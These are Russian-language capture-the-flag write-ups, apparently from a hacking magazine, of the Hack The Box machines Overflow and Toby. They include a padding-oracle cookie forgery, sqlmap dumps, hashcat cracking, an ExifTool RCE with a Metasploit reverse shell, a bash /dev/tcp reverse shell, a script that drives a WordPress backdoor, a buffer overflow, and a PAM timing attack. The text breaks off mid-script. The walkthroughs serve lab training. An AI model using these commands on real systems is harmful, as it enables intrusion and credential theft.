Нас просят выбрать вариант ответа, уведомляющий об ошибке дополнения.
Рекомендован третий вариант, его и указываем.





                        Вскрытие исходного текста

В итоге мы получаем открытый текст, зашифрованный в cookie: user=ralf.
Теперь мы понимаем формат данных для аутентификации. Сервер рас‐
шифровывает  куки и  определяет  текущего  пользователя. Но эта  атака
помогает не только вскрыть зашифрованные данные, но и заново зашиф‐
ровать свои! Так мы можем указать PadBuster, что нужно зашифровать подоб‐
ную строку для пользователя Admin.


padbuster http://overflow.htb/home/index.php
Ow%2F5zdCFrSoAl%2FO6Mo3gaD8Y79JztfUX 8 -cookies auth=
Ow%2F5zdCFrSoAl%2FO6Mo3gaD8Y79JztfUX -plaintext "user=Admin"





                   Новые перезашифрованные данные

Спустя некоторое время мы получим куки, применив которые подключимся
от имени администратора. На сайте нам становится доступна административ‐
ная панель, с которой мы можем получить доступ к CMS Made Simple и най‐
денным ранее логам.





                   Форма авторизации Made Simple

Так как никаких учетных данных у нас нет, нужно проверить существующие
эксплоиты, а для этого узнать версию продукта. Исходники Made Simple
открыты, и можно подсмотреть путь к файлу с описанием обновлений: /doc/
CHANGELOG.txt.





                           Версия Made Simple

В этом файле последней упоминается версия 2.2.8. Утилита searchsploit
для поиска эксплоитов в базе Exploit-DB помогает найти PoC эксплуатации
SQL Injection для версии меньше 2.2.10.


searchsploit 'CMS made simple'
searchsploit -p php/webapps/46635.py





                  Поиск эксплоитов с помощью searchsploit

Но проэксплуатировать уязвимость не выходит, поэтому перейдем к логам.





                                   Логи сайта

В самих логах ничего полезного не находим. Однако если посмотреть на зап‐
рос в Burp, то сам способ запроса привлекает внимание.





                           Запрос логов в Burp

Страница logs.php принимает параметр name, а это новая точка входа!


SQL Injection
Я веду несколько словарей, содержащих разные последовательности‑триг‐
геры для разных уязвимостей. На словаре для определения инъекций SQL
у меня определилось несколько видов ответов.





                 Burp Intruder — вкладка Payload Positions





                                 Результат перебора

Чтобы раскрутить уязвимость, воспользуемся sqlmap. Указываем получен‐
ные ранее cookie, а тестируемое место — символом *.


sqlmap -u 'http://overflow.htb/home/logs.php?name=*' --cookie auth=
BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA





                  Определение нагрузки для эксплуатации

Sqlmap нашел уязвимый запрос, поэтому попробуем достать интересные
данные. Первым делом получим список баз данных (параметр --dbs).


sqlmap -u 'http://overflow.htb/home/logs.php?name=*' --cookie auth=
BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA --dbs





                            Список баз данных

Логи нам неинтересны, служебная база — тоже, а вот cmsmsdb — это база
данных Made Simple. Она должна содержать учетные данные. Получим список
таблиц (параметр --tables) из этой базы (параметр -D).


sqlmap -u 'http://overflow.htb/home/logs.php?name=*' --cookie auth=
BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb --tables





                              Список таблиц

Нас интересует таблица cms_users. Выводим все содержимое (параметр --
dump) из этой таблицы (параметр -T).


sqlmap -u 'http://overflow.htb/home/logs.php?name=*' --cookie auth=
BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb -T cms_users --dump





                     Содержимое таблицы cms_users

Получаем два хеша пользовательских паролей. Теперь попробуем их кряк‐
нуть. Made Simple использует хеширование MD5 с солью по схеме md5(salt
+ pass) (для hashcat это режим 20). Соль мы можем получить как sitemask
из таблицы cms_siteprefs.


sqlmap -u 'http://overflow.htb/home/logs.php?name=*' --cookie auth=
BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb -T cms_siteprefs --dump




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
      HTB OVERFLOW
            УПРАЖНЯЕМСЯ В АТАКЕ PADDING ORACLE
                И ЭКСПЛУАТИРУЕМ БАГ В EXIFTOOL





                       Соль для хеша MD5

Хеш и соль нужно записать в файл в формате hash:salt, после чего отдать
его на перебор в hashcat, который очень быстро вернет нам пароль поль‐
зователя editor.


hashcat -a 0 -m 20 hashes rockyou.txt





                             Результат перебора хешей

Учетные данные помогают авторизоваться в Made Simple.





                     Главная страница CMS Made Simple

Погуляв по сайту, находим новый домен. А это новая точка входа!





                        Страница User Defined Tags


ТОЧКА ОПОРЫ
Новый домен сразу добавляем в файл /etc/hosts.


10.10.11.119    overflow.htb devbuild-job.overflow.htb





                 Форма авторизации Overflow Devbuild

Разобраться с формой авторизации нам помогают учетные данные поль‐
зователя editor. Нам открывается какой‑то магазин дизайна приложений.
И первым делом я отправился искать возможность что‑то изменить в нас‐
тройках аккаунта в надежде найти очередную точку входа.





                      Главная страница веб‑приложения

В профиле есть возможность загрузить резюме — то, что нужно! Попытки
залить разные нагрузки успехом не увенчались, так как форма принимает
только файлы TIFF и JPEG.





                       Форма загрузки резюме

Однако потом я решил глянуть, что предлагает мне Burp, и нашел в ответе
вывод ExifTool версии 11.02.





                                 Ответ сервера

Так как мы знаем версию программы, нужно сразу проверить наличие задоку‐
ментированных эксплоитов.





                         Поиск эксплоитов в Google

Мы тут же получаем CVE-идентификатор уязвимости, которая может дать нам
удаленное выполнение кода. Оно возможно, поскольку при обработке изоб‐
ражения не  фильтруются  пользовательские  данные, что  позволяет нам
записать в качестве этих данных нагрузку. Для этой уязвимости есть даже
готовый билдер в Metasploit Framework:


exploit/unix/fileformat/exiftool_djvu_ant_perl_injection

Выбираем в качестве нагрузки реверс‑шелл Unix и указываем адрес хоста
и порт, на котором запущен листенер (запускаем командой rlwrap -cAr nc
-lvp 4321).


msfconole -q
use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
set payload cmd/unix/reverse_netcat
set LHOST 10.10.14.17
set LPORT 4321




                   Генерирование изображения с нагрузкой

Засылаем картинку и тут же получаем бэкконнект от сервера.





                                 Логи листенера


ПРОДВИЖЕНИЕ
Пользователь developer
Так как на хосте развернут веб‑сервер, а на нем работает несколько веб‑при‐
ложений, то первое наше действие — попробовать получить учетные данные
пользователей. Высока вероятность того, что эти логины и пароли подойдут
для каких‑то пользователей в системе. К тому же был каталог content, именно
в нем мы и находили файл с учетными данными для подключения к базе дан‐
ных.





                       Содержимое файла db.php

От имени пользователя developer подключаемся по SSH.




                      Сессия пользователя developer


Пользователь tester
Как показывает команда id, наш пользователь состоит в группе network.
Это не какая‑то умолчательная настройка.
  Для сбора информации с машины я использовал скрипт LinPEAS. С его
помощью определяем, что члены группы network имеют право записи в файл
/etc/hosts, а также текущему пользователю разрешен запуск файла /opt/
commontask.sh, владельцем которого является tester.





                       Файлы, доступные для записи





                       Файлы со списком доступа

Просмотрим содержимое файла /opt/commontask.sh.





                    Содержимое файла commontask.sh

Этот скрипт скачивает файл task.sh с адреса taskmanage.overflow.htb
и выполняет с помощью bash. Дело в том, что хост не знает этого имени и не
может его зарезолвить, но мы можем записать его в файл /etc/hosts на уда‐
ленном хосте, а в качестве адреса указать свой хост.





                      Содержимое файла /etc/hosts

Создаем на своем веб‑сервере скрипт task.sh, куда записываем обычный
реверс‑шелл:


bash -i >& /dev/tcp/10.10.14.7/4321 0>&1`

В течение минуты получаем бэкконнект.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Среди файлов со списком доступа, обнаруженных с помощью LinPEAS, был
и /opt/file_encrypt. Он может запускаться пользователем tester от име‐
ни рута. В этой директории я обнаружил сообщение, в котором говорится
о том, что нужно обратить внимание на функцию проверки ПИН‑кода.




                  Содержимое каталога /opt/file_encrypt




                       Тестовый запуск приложения

Скачиваем приложение на локальную машину, чтобы хорошенько разревер‐
сить и понять, что в нем происходит. Для анализа приложения я использовал
IDA Pro с декомпилятором Hex-Rays.


Анализ приложения
Итак, в функции main кроме вызова функции check_pin больше ничего
не происходит.





                              Функция main

В функции check_pin генерируется псевдослучайное число (строка 8), затем
оно передается в функцию random для дальнейших преобразований (стро‐
ка 9). ПИН‑код считывается из консоли и сравнивается с преобразованным
рандомным значением (строки 11–13). Далее считывается имя и выводится
сообщение (строки 14–16).





                            Функция check_pin





                             Функция random

Сразу обозначим следующее:
 • сгенерированное «рандомное»  число  всегда будет одним и тем же
   при каждом запуске программы, так как не используется инициализация
   рандомайзера;
 • длина буфера v1 — 20 байт, при этом длина считываемой строки не про‐
   веряется. Таким образом, мы имеем переполнение буфера.

В списке функций найдем еще одну, которая нигде не вызывается, — функция
encrypt.





                             Список функций





                     Проверка ссылок на функцию encrypt

В начале функции у нас запрашивают два файла (строки 35–50). Затем
выполняется посимвольное чтение из первого файла, XOR с символом 0x9B
и запись во второй файл (строки 52–78).





                             Функция encrypt

Таким образом мы можем заранее зашифровать файл с ключом 0x9B,
а затем перезаписать любой файл в системе. При повторном шифровании
в программе он будет расшифрован. Осталось вызвать функцию encrypt,
для чего нужно получить ПИН и переполнить буфер.


Получение ПИН-кода
Чтобы узнать ПИН‑код, я решил просто запустить приложение в отладчике
и получить его значение после выполнения функции random (результат
в регистре EAX).





                             Получение ПИН‑кода

Так как первый байт (0xf3) больше, чем 0x7f, то наше число будет представ‐
лено  как  отрицательное. То есть нам  нужно из полученного  значения
вычесть 0x100000000, выйдет -202976456 — это и есть наш ПИН.


Переполнение буфера
В тестировании переполнения буфера очень помогают генераторы пос‐
ледовательностей де Брёйна (неповторяющихся цепочек символов). Они
к тому же помогают точно вычислить смещение, по которому мы можем
перезаписывать в стеке адрес возврата из функции. Сгенерировать такую
последовательность можно, к примеру, с помощью незаменимого pwntools.
Сгенерируем строку длиной 200 символов.




                Генерирование последовательности де Брёйна

Теперь передадим ее в качестве имени нашему приложению и посмотрим,
на каком адресе вылетит программа.





                    Ошибка выполнения программы

Так, 0x6161616c соответствует последовательности laaa. Получим смещение
в последовательности.





                             Получение смещения

Выходит, до адреса функции encrypt мы должны передать 44 байта. Оста‐
лось получить адрес функции. Для этого запускаем программу на удаленном
хосте через отладчик GDB, запускаем программу (команда r), после чего
посылаем сигнал завершения (Ctrl-C) и просматриваем функцию encrypt
(команда disas encrypt). Искомый адрес — 0x5655585b.





                      Получение адреса функции encrypt

Что удобно, адрес полностью состоит из печатаемых символов.




                     Нагрузка для переполнения буфера

После запуска программы ввода ПИН‑кода и  нагрузки, переполняющей
буфер, у нас спрашивают путь к файлу. Таким образом нам удалось перейти
к функции encrypt.





                        Проверка полученных значений


Перезапись файла
Сначала я хотел перезаписать файл authorized_keys, чтобы потом подклю‐
читься по SSH, но ничего не вышло. Тогда я решил перезаписать файл /etc/
passwd. Добавим туда нового  пользователя с высокими  привилегиями.
Но сначала зашифруем пароль этого пользователя.



              Шифрование пароля нового пользователя

Затем скопируем содержимое файла /etc/passwd в файл /tmp/passwd
и добавим в конец строку, отвечающую за нашего пользователя.





                     Добавление записи в /tmp/passwd

Теперь проксорим этот файл.


src = open("/tmp/passwd", "rb").read()
dst = open("/tmp/passwd.n", "wb")
for i in src:
   dst.write(bytes([i^0x9b]))

И укажем эти файлы в программе.





                             Эксплуатация уязвимости

Программа рухнула, но свою задачу выполнила. Осталось просто сменить
пользователя и забрать флаг рута.





                           Флаг рута

Машина захвачена!
ВЗЛОМ

         HTB
 TOBY





        ВЗЛАМЫВАЕМ СЕРВЕР
    ЧЕРЕЗ ЧЕРЕДУ ЧУЖИХ БЭКДОРОВ





Сегодня мы с тобой разберем  прохож‐
дение «безумной» по сложности машины
с  площадки Hack The Box. Посмотрим,
как   работает   бэкдор  для  WordPress,
и используем его, чтобы получить доступ             RalfHacker                                                                                             hackerralf8@gmail.com
к хосту. Затем проникнем в Docker, перех‐
ватим пароль пользователя при подклю‐
чении  к базе данных и секретный ключ
при подключении к SSH. А в конце поищем,
разберем и используем бэкдор в механиз‐
ме аутентификации Linux.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.121    toby.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Нашли четыре открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 80 — веб‑сервер Nginx 1.18.0;
 • 10022 — служба OpenSSH 8.1;
 • 10080 — пока неизвестный HTTP-сервер.

Как обычно, начнем с веб‑сервера, тем более Nmap сам нашел для нас файл
robots.txt.

Справка: robots.txt
Этот файл используется для того, чтобы попросить краулеры (например,
Google или Яндекс) не трогать какие‑то определенные каталоги. Например,
никто не хочет, чтобы в поисковой выдаче появлялись страницы авторизации
администраторов сайта, файлы или персональная информация со страниц
пользователей и прочие вещи в таком духе. Однако и злоумышленники пер‐
вым делом просматривают этот файл, чтобы узнать о файлах и каталогах,
которые хочет спрятать администратор сайта.



Сканирование веб-контента
В robots.txt записана директория wp-admin, говорящая нам о том, что сайт
работает на WordPress. Если взглянуть в историю запросов Burp, то найдем
и новый поддомен, который добавляем в /etc/hosts.


10.10.11.121    toby.htb wordpress.toby.htb





                          История запросов Burp

А на самом сайте находим сообщение о недавней атаке.





                           Главная страница сайта

Больше ничего любопытного найти не удалось, сканирование с помощью
WPScan ничего интересного тоже не показало. А так как на сайте уже есть
один  поддомен,  можем  попытаться  найти  еще.  Сканировать  будем
с помощью ffuf, а в качестве места для перебора указываем HTTP-заголовок
Host.


ffuf -u http://toby.htb -H "Host: FUZZ.toby.htb" -w subdomains-
top1million-110000.txt -t 256 -fs 10837



                       Результат сканирования поддоменов

Находим новый поддомен backup, который сразу добавляем в /etc/hosts.
А на сайте нас встречает Gogs — легковесный сервис Git, написанный на Go.


10.10.11.121    toby.htb wordpress.toby.htb backup.toby.htb





                           Главная страница сайта


ТОЧКА ВХОДА
В Git находим одного пользователя toby-admin, чьи репозитории не отоб‐
ражаются.





                        Активные пользователи Gogs

Но попробуем просканировать репозитории как каталоги с помощью того же
ffuf.


ffuf -u http://backup.toby.htb/toby-admin -w directory_2.3_medium_
lowercase.txt -t 256




                          Сканирование каталогов

В итоге находим два каталога, один из которых не возвращает никакого кон‐
тента  (starts). А вот репозиторий backup очень интересен, так как это
исходные коды сайта wordpress.toby.htb.





                    Содержимое репозитория backup

Скачиваем  репозиторий   (git  clone  http://backup.toby.htb/toby-
admin/backup.git) и для удобства открываем в каком‑нибудь редакторе
для программирования. Я буду использовать VSCode. Так как сайт построен
на WordPress, первым делом получим учетные данные для подключения к базе
данных. Они содержатся в файле wp-config.php.





                    Содержимое файла wp-config.php

Обратим внимание на хост mysql.toby.htb, о котором мы пока ничего
не знаем. Пароль для подключения к базе данных по SSH подключиться
не помог, поэтому будем анализировать исходные коды. Сообщение об атаке
было оставлено не просто так, скорее всего, нам нужно найти бэкдор. Так
как это PHP-файлы, я попробовал поискать в них «опасные» функции.
И находим интересное применение функции eval, которая нужна для выпол‐
нения передаваемого в нее кода на PHP.





                              Поиск по строкам

Переходим к файлу comment.php, где в функцию eval после нескольких опе‐
раций по преобразованию передается закодированная последовательность.





                    Содержимое файла comment.php

Это не обычный код WordPress, поэтому остановимся именно на нем. Пос‐
мотрим, где вызывается функция wp_handle_comment_submission.





                              Поиск по строкам

И видим вызов из файла wp-comments-post.php. То есть мы можем получить
доступ к бэкдору при отправке комментариев к посту. Давай разбираться
с самим бэкдором.


ТОЧКА ОПОРЫ
Я скопировал код бэкдора и обернул его в теги PHP, чтобы получить декоди‐
рованный код. Но там оказался точно такой же вложенный код!





                         Модернизирование кода





                          Декодированный бэкдор

Похоже, таких уровней вложенности будет много. Я решил воспользоваться
онлайновым сервисом для деобфускации кода.





                     Деобфусцированный код бэкдора

Здесь представлен только механизм авторизации для получения доступа
к  основному  коду,  которому  передается  управление  через  функцию
wp_validate_4034a3 (строка  8). Туда переправляются переменные host
и sec. Так, в комментарии должны быть указаны help@toby.htb в качестве
почтового адреса и http://test.toby.htb/ в качестве URL. Переменные
host и sec должны быть разделены символом :, и перед этой последователь‐
ностью должна идти строка 746f6279. По синтаксису я решил, что sec —
это порт, куда должен прийти бэкконнект. Откроем листенер и отправим
пробный комментарий.





                       Отправка комментария под постом

Но на листенер ничего не пришло. Тогда откроем Wireshark, отбросим весть
трафик, связанный с 80-м портом, и повторим наш коммент. И увидим попыт‐
ку бэкконнекта на порт 20053!





                            Трафик в Wireshark

Перезапустим листенер с указанием нового порта и снова получим бэк‐
коннект. В итоге вместо реверс‑шелла нам приходит какая‑то строка. Веро‐
ятно, придется программировать самим. Давай автоматизируем отправку
запроса и прием бэкконнекта.


import socket
import requests


for i in range(2):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 20053))
    sock.listen(1)


    try:
        url = 'http://wordpress.toby.htb/wp-comments-post.php'
        data = {"comment": "746f627910.10.14.82:4321", "author":
"ralf", "email": "help@toby.htb", "url": "http://test.toby.htb/",
"submit": "Post Comment", "comment_post_ID": "2", "comment_parent":
"0"
}
        requests.post(url, data = data, timeout = 0.5)
    except requests.exceptions.Timeout:
        pass


    conn, address = sock.accept()
    data = conn.recv(1024)


    print(data.decode())


    conn.close()
    sock.close()




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
           HTB TOBY
              ВЗЛАМЫВАЕМ СЕРВЕР ЧЕРЕЗ ЧЕРЕДУ
                             ЧУЖИХ БЭКДОРОВ





                             Выполнение кода

Еще я заметил, что при каждом новом запросе первая часть строки ответа
(GUID) изменяется, а вторая часть остается такой же за исключением двух
символов.




                             Выполнение кода

Это натолкнуло на мысль о том, что строка закодирована в hex. И пред‐
положение оказалось верным. Если у тебя установлен пакет pwntools,
можешь использовать команду unhex.





                Декодирование шестнадцатеричных значений

Также получаем новую пометку: xor_key. Я попытался снова декодировать
уже новое шестнадцатеричное значение, но получил какие‑то непонятные
символы. Про XOR упоминается неспроста, поэтому нужно попробовать
проксорить полученные данные, но с каким ключом? Из всех используемых
данных мы не нашли применения только отправленному параметру sec. Я
использовал это значение в качестве ключа для XOR и получил внятную стро‐
ку!





                       Декодирование значения xor_key

Таким образом, при каждом новом запросе будет изменяться лишь одна бук‐
ва посередине. В дальнейшем для удобства в качестве значения sec будем
указывать 00, чтобы не происходил XOR (так как x^0=x). Но это не все, пос‐
кольку после получения строки соединение с сервером не обрывается. Поп‐
робуем послать ему какую‑нибудь строку, на что нам снова придет ответ!




                            Тестирование бэкдора

Попытка декодировать HEX и ксорить полученную строку со значением sec
не увенчалась успехом. Однако попробуем использовать в качестве ключа
код символа, отправляемого нам сервером, — он обрамляется строками
KEY_PREFIX_ и _KEY_SUFFIX.





                     Декодирование второго сообщения

Это строка cmd:, то есть у нас запрашивают команду. Попробуем отправить
команду id вместо случайной строки, при этом проксорив ее ключом сер‐
вера. Конечно, это все автоматизируем.


import socket
import requests
import binascii


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 20053))
sock.listen(1)


try:
   url = 'http://wordpress.toby.htb/wp-comments-post.php'
   data = {"comment": "746f627910.10.14.82:00", "author": "ralf",
"email": "help@toby.htb", "url": "http://test.toby.htb/", "submit":
"Post Comment", "comment_post_ID": "9", "comment_parent": "0"}
   requests.post(url, data = data, timeout = 0.5)
except requests.exceptions.Timeout:
   pass


conn, address = sock.accept()
data = conn.recv(1024).split(b'|')[1].strip()
xor_key_hex = binascii.unhexlify(data).split(b':')[1]
key = binascii.unhexlify(xor_key_hex).split(b'_')[2][0]


command = b"id"
xor_command = bytes([c^key for c in command])
conn.send(xor_command)


data_xor_hex = conn.recv(1024).split(b'|')[1].strip()
data_xor = binascii.unhexlify(data_xor_hex)
result = bytes([c^key for c in data_xor]).decode()
print(result)





                             Выполнение кода

И мы получаем RCE! Откроем листенер rlwrap -cAr nc -lvp 80 и выпол‐
ним реверс‑шелл:


bash -c 'bash -i >& /dev/tcp/10.10.14.82/80 0>&1'

Сразу скажу, что пробросить соединение на порт 4321 не вышло, поэтому
пробуем популярные веб‑порты, к примеру 80-й.





                            Получение бэкконнекта


ПРОДВИЖЕНИЕ
Сбор учетных данных
Мы получаем доступ к хосту, но как повысить привилегии? Наиболее веро‐
ятный способ получить учетку пользователя — завладеть его паролем.
   Так как мы работаем от имени службы веб‑сервера (www-data), а на хосте
установлены два движка (WordPress и Gogs), можно попробовать получить
учетные данные из их баз данных. Кстати, учетка для подключения к БД у нас
уже есть — из файла wp-config.php. Осталось узнать адрес хоста mysql.
toby.htb.


nslookup mysql.toby.htb





                  Получение адреса хоста по его DNS-имени

Поскольку СУБД установлена на другом хосте (скорее всего, это Docker),
для удобной работы лучше построить SOCKS-туннель во внутреннюю сеть.
Для этого будем использовать утилиту Chisel. Загружаем собранную версию
и на локальный хост, и на удаленный.
  Для загрузки на удаленный хост:
 • Открываем на локальном хосте в каталоге с программой простой веб‑сер‐
   вер python3 -m http.server 88.
 • На удаленном хосте выполняем команду curl http://10.10.14.82:
  88/chisel -o chisel для загрузки.
 • На локальном хосте запускаем серверную часть, ожидающую подклю‐
   чение на порт 88.


./chisel server -p 88 --reverse





                             Логи серверной части

На удаленном хосте запускаем клиентскую часть. В логах сервера мы должны
увидеть информацию о подключении.


./chisel client 10.10.14.82:88 R:socks





                             Логи серверной части

Туннель готов, осталось настроить proxychains для проксирования трафика.
В конфиг /etc/proxychains4.conf внесем следующую запись.





                Содержимое файла /etc/proxychains4.conf

А теперь подключаемся к СУБД через наш туннель и смотрим список баз дан‐
ных.


proxychains -q mysql -h 172.69.0.102 -u root
-pOnlyTheBestSecretsGoInShellScripts


show databases;





                            Список баз данных

Получаем доступ сразу к обеим системам. Gogs хранит учетные данные
в столбцах name, passwd и salt таблицы user.


use gogs;
select name,passwd,salt from user;





              Получение критически важных данных из базы Gogs

В базе WordPress обратимся к столбцам user_login и user_pass таблицы
wp_users.





           Получение критически важных данных из базы WordPress

Хеши из WordPress закидываем на перебор в hashcat, но у нас ничего
не выходит. Мне подсказали использовать комбинированный список паролей
с учетом имени пользователя. И это дало результат!


hashcat -m 400 --user hashes rockyou.txt




                           Пароль пользователя


Получение доступа к Docker
С учеткой этого пользователя можем авторизоваться в Gogs. Так мы получа‐
ем доступ к двум закрытым репозиториям.





                           Главная страница Gogs

Первый репозиторий содержит какую‑то базу, пока неясно, что это. А вот
во втором содержится новое веб‑приложение.





                    История коммитов Personal-Webapp

Интереснее всего код обработчика /api/dbtest. Эта страница принимает
параметр secretdbtest_09ef, в котором должен передаваться адрес хоста.
Если мы передадим свой хост, то можем вызвать подключение к нему и таким
образом забрать учетные данные для подключения к базе данных.





                   Исходный код пути роута /api/dbtest

Найдем хост, где развернуто это веб‑приложение. Попробуем запросить
адрес хоста personal.toby.htb (по имени приложения).


 nslookup personal.toby.htb





                        Адрес хоста personal.toby.htb

Чтобы не разворачивать локальную базу данных, воспользуемся инструмен‐
том RogueSQL. Запускаем скрипт и указываем ему любой файл.


 python2 RogueSQL.py -f hashes

Откроем Wireshark и установим фильтр mysql. А затем с удаленного хоста
обратимся  к  найденному  веб‑приложению и  передадим  адрес  своей
машины.


 curl http://172.69.0.104/api/dbtest?secretdbtest_09ef=10.10.14.82

В логах RogueSQL обнаружим информацию о подключении, а в Wireshark —
прилетевшие пакеты.





                                 Логи RogueSQL





                               Окно Wireshark

Нас интересует пакет Server Greeting, в котором передается соль, и Login
Request, где передается хеш пароля.





                    Содержимое пакета Server Greeting





                    Содержимое пакета Login Request

Теперь нужно собрать хеш в формат hashcat:


$mysqlna$salt*hash

Соль соберем из двух частей и представим в шестнадцатеричном формате.





                        Кодирование соли для хеша

Тут нужно вспомнить, что перед кодом обработчика /api/dbtest мы встре‐
чали  комментарий,  где  было  отмечено,  что  учетная  запись  добав‐
лена 07/07/21 и удалена из окружения 10/07/21. Генератор пароля можно
найти в более позднем коммите, причем он зависит от модуля random.





                             Коммит app.py

А  функция random зависит от  времени,  когда она была  вызвана,  так
как текущее время используется в качестве сида для генерации псевдослу‐
чайного числа. То есть, зная временные промежутки, мы можем составить
список всех возможных паролей.
  Код для получения времени в формате Epoch из даты можно взять прямо
с сайта EpochConverter.





                         Код конвертера




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
           HTB TOBY
              ВЗЛАМЫВАЕМ СЕРВЕР ЧЕРЕЗ ЧЕРЕДУ
                             ЧУЖИХ БЭКДОРОВ




А теперь сгенерируем список.


import random
import string
import calendar, time;


start = calendar.timegm(time.strptime('2021-07-07 00:00:00',
'%Y-%m-%d %H:%M:%S'))
finish = calendar.timegm(time.strptime('2021-07-11 00:00:00',
'%Y-%m-%d %H:%M:%S'))


chars = string.ascii_letters + string.digits
for t in range(start, finish):
   random.seed(t)
   password = ''.join([random.choice(chars) for i in range(32)])
   print(password)

Отправляем хеш на брут по сгенерированному списку и получаем пароль.


hashcat -m 11200 jack.hash passwd.lst




                  Пароль для подключения к базе данных

Подключиться  к основному  хосту по SSH с этим паролем не  вышло.
Но получилось к хосту mysql.toby.htb.


proxychains -q ssh jack@172.69.0.102




                         Сессия пользователя jack


Выход из Docker
Чтобы провести разведку в «Докере» и поискать пути выхода из него, я
использую скрипт Deepce, но в этот раз ему не удалось ничего найти.
   Загрузим на хост pspy — приложение для мониторинга запускаемых
в системе процессов. И спустя минуту увидим запуск команды SSH, а потом
и SCP. Причем используется аутентификация по ключу, который, видимо, сох‐
раняется на хост в момент подключения.





                                    Логи pspy

Запускаем команду чтения ключа в бесконечном цикле. Как только ключ будет
сохранен как /tmp/*/key, он отобразится у нас в консоли.


while : ; do cat /tmp/*/key 2>/dev/null ; done





                      SSH-ключ пользователя

И с этим ключом мы подключаемся к основной системе.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Никакие скрипты для разведки на локальном хосте не помогли, но у нас
еще  есть  файл  базы  данных.  Для  просмотра  я  обычно  использую
DBBrowser. В базе нашлись всего две таблицы, имеющие по три записи.





                     Содержимое таблицы enc_meta





                    Содержимое таблицы support_enc

По названию столбцов можно понять, что таблицы содержат данные, зашиф‐
рованные AES-CBC, а также соответствующие ключи шифрования и векторы
инициализации.  Расшифровать  можем  с  помощью  известного  сайта
CyberChef.





                           Первое сообщение





                            Второе сообщение

Удалось расшифровать два сообщения, третье оказалось битое. Во втором
сообщении говорится, что аутентификация стала медленнее после атаки,
но автоматические сканеры ничего не нашли. Скорее всего, нам снова пред‐
лагают найти и использовать бэкдор — на этот раз в механизме аутентифика‐
ции.


Подключаемые модули аутентификации Linux
PAM (Pluggable Authentication Modules) — это набор библиотек для Unix-
подобных операционных систем, предназначенный для настройки аутен‐
тификации между приложениями. Многие популярные приложения, с которы‐
ми ты работаешь в Linux, внутри используют PAM. Например, утилита su.
   Когда приложение запрашивает аутентификацию, PAM считывает соот‐
ветствующий конфигурационный файл. Конфигурационные файлы содержат
списки модулей PAM и методы их обработки. Модули вызываются по очереди.
Каждый вызов модуля генерирует успешный результат или отказ. Исходя
из этих значений, конфигурационный файл возвращает либо сообщение
об успешной аутентификации (authentication okay), либо сообщение об ошиб‐
ке (authentication failure).
   Настройки содержатся в конфигурационных файлах common-auth, common-
account и common-session-noninteractive в каталоге /etc/pam.d/. Прос‐
мотрим первый.





               Содержимое файла /etc/pam.d/common-auth

В файле указан модуль mypam.so. Это явно что‑то нестандартное, давай най‐
дем сам файл модуля для дальнейшего анализа.


find / -name mypam.so 2>/dev/null




                                Поиск модуля

Загружаем модуль по SSH:


scp -i jack.key jack@toby.htb:/usr/lib/x86_64-linux-gnu/security/
mypam.so ./

И закидываем в IDA Pro. Начинаем анализ с получения списка функций.





                             Список функций

Нас интересует функция pam_sm_authenticate, которая непосредственно
выполняет задачу аутентификации пользователя.





                Декомпиляция функции pam_sm_authenticate

Внутри функции происходит вызов pam_get_user (строка 29) для получения
имени  пользователя.  После  проверки  кеширования  токена  (функция
pam_get_authtok, строка 42) запускается цикл, в котором десять раз посим‐
вольно читается файл /etc/.bd и сразу сравнивается с введенным паролем.
Если  считанный  символ равен  введенному,  то  производится  задержка
на 0,1 секунды (строки 54–72). Файл /etc/.bd доступен для чтения только
суперпользователю и содержит как раз десять символов.



                        Файл /etc/.bd

Задержка после верно введенного символа может служить индикатором.
А значит, мы можем просто посимвольно подобрать пароль. Первым делом я
записал в файл все печатаемые символы.


python3 -c 'import string; print(" ".join(string.printable))' > list.
txt

А затем накидал простой скрипт, который перебирает первый символ пароля
и выводит время выполнения команды.


#!/bin/bash
for var in $(cat list.txt)
do
    echo -n " $var " ; echo $var'         ' | time su 2>&1 | grep
elapsed | cut -d ' ' -f 3
done





                             Вывод скрипта

При вводе символа T задержка больше, чем в ответ на другие символы, а зна‐
чит, мы на верном пути. Немного модернизируем скрипт, чтобы определять
задержку автоматически и выводить найденный символ:


#!/bin/bash
passw=""
for var in $(cat list.txt)
do
       echo -n " $var " ; echo "$passw$var        " | time su 2>&1 |
grep elapsed | cut -d ' ' -f 3 | grep -v '0:01.0' && echo " - $var" &
& break
done





                        Подбор первого символа

Немного изменим скрипт для подбора второго символа.


#!/bin/bash
passw="T"
for var in $(cat list.txt)
do
